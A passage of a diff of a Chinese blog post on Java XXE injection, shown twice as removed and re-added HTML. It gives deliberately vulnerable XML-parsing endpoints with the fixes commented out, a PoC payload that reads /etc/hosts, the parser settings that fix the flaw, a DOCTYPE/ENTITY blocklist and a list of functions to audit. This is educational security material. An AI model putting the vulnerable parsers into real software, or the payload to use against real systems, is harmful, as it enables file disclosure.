-</span></span><span style=display:flex><span><span style=color:#a6e22e>@RequestMapping</span>(value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/SAXBuilder&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>SAXBuilder</span>(<span style=color:#a6e22e>@RequestBody</span> String content) {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
-</span></span><span style=display:flex><span>        SAXBuilder saxbuilder <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> SAXBuilder();
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// 修复: saxbuilder.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
-</span></span><span style=display:flex><span>        saxbuilder.<span style=color:#a6e22e>build</span>(<span style=color:#66d9ef>new</span> InputSource(<span style=color:#66d9ef>new</span> StringReader(content)));
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;SAXBuilder XXE&#34;</span>;
-</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (Exception e) {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> e.<span style=color:#a6e22e>toString</span>();
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h3 id=documentbuilder>DocumentBuilder</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>/**
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * DocumentBuilder 是用于构建和解析 XML 文档的类，它是基于 DOM (Document Object Model) 的实现。
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * DocumentBuilder 提供了创建、解析、修改 XML 文档的功能，并支持各种解析选项。在使用 DocumentBuilder 时，
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 需要注意配置安全选项，例如禁用外部实体和 DTD，以防止潜在的安全漏洞。
-</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
-</span></span><span style=display:flex><span>DocumentBuilderFactory factory <span style=color:#f92672>=</span> DocumentBuilderFactory.<span style=color:#a6e22e>newInstance</span>();
-</span></span><span style=display:flex><span><span style=color:#75715e>// 修复: 禁用外部实体</span>
-</span></span><span style=display:flex><span><span style=color:#75715e>// factory.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
-</span></span><span style=display:flex><span>DocumentBuilder builder <span style=color:#f92672>=</span> factory.<span style=color:#a6e22e>newDocumentBuilder</span>();
-</span></span></code></pre></div><h3 id=unmarshaller>Unmarshaller</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>/**
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * Unmarshaller 是 JAXB (Java Architecture for XML Binding) 的核心组件之一，
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 它将 XML 数据转换为 Java 对象。Unmarshaller 提供了将 XML 数据映射到相应 Java 类的功能，
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 并支持各种自定义配置。在使用 Unmarshaller 时，需要注意处理 XML 数据中的外部实体和 DTD，
-</span></span></span><span style=display:flex><span><span style=color:#75715e> * 以确保安全性。
-</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#75715e>/**
-</span></span></span><span style=display:flex><span><span style=color:#75715e>  *  PoC
-</span></span></span><span style=display:flex><span><span style=color:#75715e>  * Content-Type: application/xml
-</span></span></span><span style=display:flex><span><span style=color:#75715e>  * &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE student[&lt;!ENTITY out SYSTEM &#34;file:///etc/hosts&#34;&gt;]&gt;&lt;student&gt;&lt;name&gt;&amp;out;&lt;/name&gt;&lt;/student&gt;
-</span></span></span><span style=display:flex><span><span style=color:#75715e>  */</span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>Unmarshaller</span>(<span style=color:#a6e22e>@RequestBody</span> String content) {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
-</span></span><span style=display:flex><span>        JAXBContext context <span style=color:#f92672>=</span> JAXBContext.<span style=color:#a6e22e>newInstance</span>(Student.<span style=color:#a6e22e>class</span>);
-</span></span><span style=display:flex><span>        Unmarshaller unmarshaller <span style=color:#f92672>=</span> context.<span style=color:#a6e22e>createUnmarshaller</span>();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        XMLInputFactory xif <span style=color:#f92672>=</span> XMLInputFactory.<span style=color:#a6e22e>newFactory</span>();
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// 修复: 禁用外部实体</span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &#34;&#34;);</span>
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// xif.setProperty(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &#34;&#34;);</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        XMLStreamReader xsr <span style=color:#f92672>=</span> xif.<span style=color:#a6e22e>createXMLStreamReader</span>(<span style=color:#66d9ef>new</span> StringReader(content));
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        Object o <span style=color:#f92672>=</span> unmarshaller.<span style=color:#a6e22e>unmarshal</span>(xsr);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> o.<span style=color:#a6e22e>toString</span>();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>} <span style=color:#66d9ef>catch</span> (Exception e) {
-</span></span><span style=display:flex><span>    e.<span style=color:#a6e22e>printStackTrace</span>();
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h2 id=漏洞修复>漏洞修复</h2><p>一方面是禁用外部实体</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-toml data-lang=toml><span style=display:flex><span><span style=color:#e6db74>&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;</span>, <span style=color:#66d9ef>true</span> 
-</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;</span>, <span style=color:#66d9ef>false</span>
-</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;http://xml.org/sax/features/external-general-entities&#34;</span>, <span style=color:#66d9ef>false</span>
-</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;http://xml.org/sax/features/external-parameter-entities&#34;</span>, <span style=color:#66d9ef>false</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>XMLConstants</span>.<span style=color:#a6e22e>ACCESS_EXTERNAL_DTD</span>, <span style=color:#e6db74>&#34;&#34;</span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>XMLConstants</span>.<span style=color:#a6e22e>ACCESS_EXTERNAL_STYLESHEET</span>, <span style=color:#e6db74>&#34;&#34;</span>
-</span></span></code></pre></div><p>另一方面可以使用黑名单过滤掉外部实体中的关键词,这两个关键字是定义外部实体和文档类型声明的标志&mldr;不过貌似有上面的禁用就够了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>checkXXE</span>(String content) {
-</span></span><span style=display:flex><span>    String<span style=color:#f92672>[]</span> black_list <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;ENTITY&#34;</span>, <span style=color:#e6db74>&#34;DOCTYPE&#34;</span>};
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (String s : black_list) {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (content.<span style=color:#a6e22e>toUpperCase</span>().<span style=color:#a6e22e>contains</span>(s)) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h2 id=漏洞发现>漏洞发现</h2><p>是否禁止dtd或者entity
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_7.png" alt=""  />
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_8.png" alt=""  /></p>
+<h3 id="saxreader">SAXReader</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * SAXReader 是一个用于读取和解析 XML 文档的类。它基于 SAX (Simple API for XML) 实现，
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 提供了简单的 API 以便快速解析 XML。SAXReader 通常用于处理大规模 XML 数据流。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 在使用 SAXReader 时，需要采取相应的安全措施来防止 XML 外部实体注入等攻击。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ApiOperation</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;vul：SAXReader&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/SAXReader&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">SAXReader</span>(<span style="color:#a6e22e">@RequestParam</span> String content) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>		SAXReader sax <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SAXReader();
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 修复：禁用外部实体</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// sax.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
+</span></span><span style="display:flex;"><span>		sax.<span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">new</span> InputSource(<span style="color:#66d9ef">new</span> StringReader(content)));
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;SAXReader XXE&#34;</span>;
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="saxbuilder">SAXBuilder</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * SAXBuilder 是一个用于构建 JDOM (Java Document Object Model) 文档的类。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 它基于 SAX 解析器，将 XML 数据解析为 JDOM 文档对象。SAXBuilder 提供了易于使用的 API，
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 使得在内存中操作 XML 文档更加方便。在使用 SAXBuilder 时，应确保配置正确的安全设置，
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 以防止潜在的 XML 处理漏洞。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/SAXBuilder&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">SAXBuilder</span>(<span style="color:#a6e22e">@RequestBody</span> String content) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        SAXBuilder saxbuilder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SAXBuilder();
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 修复: saxbuilder.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
+</span></span><span style="display:flex;"><span>        saxbuilder.<span style="color:#a6e22e">build</span>(<span style="color:#66d9ef">new</span> InputSource(<span style="color:#66d9ef">new</span> StringReader(content)));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;SAXBuilder XXE&#34;</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="documentbuilder">DocumentBuilder</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * DocumentBuilder 是用于构建和解析 XML 文档的类，它是基于 DOM (Document Object Model) 的实现。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * DocumentBuilder 提供了创建、解析、修改 XML 文档的功能，并支持各种解析选项。在使用 DocumentBuilder 时，
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 需要注意配置安全选项，例如禁用外部实体和 DTD，以防止潜在的安全漏洞。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span>DocumentBuilderFactory factory <span style="color:#f92672">=</span> DocumentBuilderFactory.<span style="color:#a6e22e">newInstance</span>();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 修复: 禁用外部实体</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// factory.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
+</span></span><span style="display:flex;"><span>DocumentBuilder builder <span style="color:#f92672">=</span> factory.<span style="color:#a6e22e">newDocumentBuilder</span>();
+</span></span></code></pre></div><h3 id="unmarshaller">Unmarshaller</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Unmarshaller 是 JAXB (Java Architecture for XML Binding) 的核心组件之一，
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 它将 XML 数据转换为 Java 对象。Unmarshaller 提供了将 XML 数据映射到相应 Java 类的功能，
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 并支持各种自定义配置。在使用 Unmarshaller 时，需要注意处理 XML 数据中的外部实体和 DTD，
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 以确保安全性。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  *  PoC
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  * Content-Type: application/xml
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  * &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE student[&lt;!ENTITY out SYSTEM &#34;file:///etc/hosts&#34;&gt;]&gt;&lt;student&gt;&lt;name&gt;&amp;out;&lt;/name&gt;&lt;/student&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">Unmarshaller</span>(<span style="color:#a6e22e">@RequestBody</span> String content) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        JAXBContext context <span style="color:#f92672">=</span> JAXBContext.<span style="color:#a6e22e">newInstance</span>(Student.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        Unmarshaller unmarshaller <span style="color:#f92672">=</span> context.<span style="color:#a6e22e">createUnmarshaller</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        XMLInputFactory xif <span style="color:#f92672">=</span> XMLInputFactory.<span style="color:#a6e22e">newFactory</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 修复: 禁用外部实体</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &#34;&#34;);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// xif.setProperty(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &#34;&#34;);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        XMLStreamReader xsr <span style="color:#f92672">=</span> xif.<span style="color:#a6e22e">createXMLStreamReader</span>(<span style="color:#66d9ef">new</span> StringReader(content));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> unmarshaller.<span style="color:#a6e22e">unmarshal</span>(xsr);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> o.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>    e.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="漏洞修复">漏洞修复</h2>
+<p>一方面是禁用外部实体</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;</span>, <span style="color:#66d9ef">true</span> 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;</span>, <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://xml.org/sax/features/external-general-entities&#34;</span>, <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://xml.org/sax/features/external-parameter-entities&#34;</span>, <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">XMLConstants</span>.<span style="color:#a6e22e">ACCESS_EXTERNAL_DTD</span>, <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">XMLConstants</span>.<span style="color:#a6e22e">ACCESS_EXTERNAL_STYLESHEET</span>, <span style="color:#e6db74">&#34;&#34;</span>
+</span></span></code></pre></div><p>另一方面可以使用黑名单过滤掉外部实体中的关键词,这两个关键字是定义外部实体和文档类型声明的标志&hellip;不过貌似有上面的禁用就够了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">checkXXE</span>(String content) {
+</span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> black_list <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;ENTITY&#34;</span>, <span style="color:#e6db74">&#34;DOCTYPE&#34;</span>};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (String s : black_list) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (content.<span style="color:#a6e22e">toUpperCase</span>().<span style="color:#a6e22e">contains</span>(s)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="漏洞发现">漏洞发现</h2>
+<p>是否禁止dtd或者entity
 参数是否可控
-传入参数格式为REST XML格式，X-RequestEntity-ContentType: application/xml</p><p>黑盒找是否有参数是xml数据,如果有的话,直接上payload测测
-白盒,搜索关键函数,进行代码审计</p><pre tabindex=0><code> * 审计的函数
+传入参数格式为REST XML格式，X-RequestEntity-ContentType: application/xml</p>
+<p>黑盒找是否有参数是xml数据,如果有的话,直接上payload测测
+白盒,搜索关键函数,进行代码审计</p>
+<pre tabindex="0"><code> * 审计的函数
  * 1. XMLReader
  * 2. SAXReader
  * 3. DocumentBuilder
@@ -222,7 +531,134 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
  * 10. SchemaFactory
  * 11. Unmarshaller
  * 12. XPathExpression
-</code></pre><h1 id=一句话总结>一句话总结</h1><p>在 Java 中，XXE（XML 外部实体注入）漏洞与其他语言类似：攻击者通过不安全的 XML 解析配置，在 XML 文档中注入恶意外部实体，能够读取本地文件、发起远程请求或执行其他恶意操作。</p><h1 id=参考>参考</h1><p>小迪sec</p><p><a href=https://www.cnblogs.com/LittleHann/p/17776458.html target=_blank rel="noopener nofollow noreferrer">Java XXE漏洞原理研究</a></p></div><span class=post-tags>#<a href=https://l1uyun.one/tags/sec/javasec/>sec/javasec</a>&nbsp;</span><div class=clear></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>阅读更多</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://l1uyun.one/posts/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/><span class=button__icon>←</span>
-<span class=button__text>javasec-反序列化</span>
-</a></span><span class="button next"><a href=https://l1uyun.one/posts/javasec-sql%E6%B3%A8%E5%85%A5/><span class=button__text>javasec-sql注入</span>
-<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright-font"><span>共 32002 字<br>还在努力更新中..</br>加油！加油啦！</span></div><a class=dark-wormhole href=https://www.foreverblog.cn/go.html target=_blank><img src=/wormhole_1.gif alt style=width:auto;height:32px title=穿梭虫洞-随机访问十年之约友链博客> </a><a class=light-wormhole href=https://www.foreverblog.cn/go.html target=_blank><img src=/wormhole_3.gif alt style=width:auto;height:32px title=穿梭虫洞-随机访问十年之约友链博客></a><div class=copyright><span>© 2024 Powered by <a href=https://gohugo.io target=_blank rel=noopener>Hugo</a> Theme by <a href=https://github.com/lmm214/immmmm/tree/master/themes/hello-friend target=_blank rel=noopener>immmmm</a></span></div></div></footer><script type=text/javascript src=/theme-main-1.js></script><script type=text/javascript src=/lately.min.js></script><script type=text/javascript src=/waterfall.min.js></script><script type=text/javascript src=/imgStatus.min.js></script><script type=text/javascript src=/view-image.js></script><script type=text/javascript src=/theme-lmm-20230123.js></script><script type=text/javascript src=/pangu.min.js></script><script>document.addEventListener("DOMContentLoaded",()=>{pangu.autoSpacingPage()})</script></div></body></html>
+</code></pre><h1 id="一句话总结">一句话总结</h1>
+<p>在 Java 中，XXE（XML 外部实体注入）漏洞与其他语言类似：攻击者通过不安全的 XML 解析配置，在 XML 文档中注入恶意外部实体，能够读取本地文件、发起远程请求或执行其他恶意操作。</p>
+<h1 id="参考">参考</h1>
+<p>小迪sec</p>
+<p><a href="https://www.cnblogs.com/LittleHann/p/17776458.html" target="_blank" rel="noopener nofollow noreferrer" >Java XXE漏洞原理研究</a></p>
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="https://l1uyun.one/tags/sec/javasec/">sec/javasec</a>&nbsp;
+        
+      </span>
+    
+  
+    <div class="clear"></div>
+    
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            
+              <span class="pagination__title-h">阅读更多</span>
+            
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://l1uyun.one/posts/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">javasec-反序列化</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://l1uyun.one/posts/javasec-sql%E6%B3%A8%E5%85%A5/">
+                  <span class="button__text">javasec-sql注入</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+
+    
+        
+    
+
+    </div>
+
+      </div>
+
+      
+        
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+
+
+
+
+
+
+
+<footer class="footer">
+  <div class="footer__inner">
+    <div class="copyright copyright-font">
+      <span>共 32002 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+    </div>
+    <a class="dark-wormhole" href="https://www.foreverblog.cn/go.html" target="_blank"> <img src="/wormhole_1.gif" alt="" style="width:auto;height:32px;" title="穿梭虫洞-随机访问十年之约友链博客"> </a>
+    <a class="light-wormhole" href="https://www.foreverblog.cn/go.html" target="_blank" > <img src="/wormhole_3.gif" alt="" style="width:auto;height:32px;" title="穿梭虫洞-随机访问十年之约友链博客"> </a>
+    
+      <div class="copyright">
+        <span>© 2024 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a> Theme by <a href="https://github.com/lmm214/immmmm/tree/master/themes/hello-friend" target="_blank" rel="noopener">immmmm</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script type="text/javascript" src="/theme-main-1.js"></script>
+<script type="text/javascript" src="/lately.min.js"></script>
+<script type="text/javascript" src="/waterfall.min.js"></script>
+<script type="text/javascript" src="/imgStatus.min.js"></script>
+<script type="text/javascript" src="/view-image.js"></script>
+<script type="text/javascript" src="/theme-lmm-20230123.js"></script>
+<script type="text/javascript" src="/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    pangu.autoSpacingPage();
+  });
+</script>
+
+
+      
+    </div>
+  </body>
+</html>
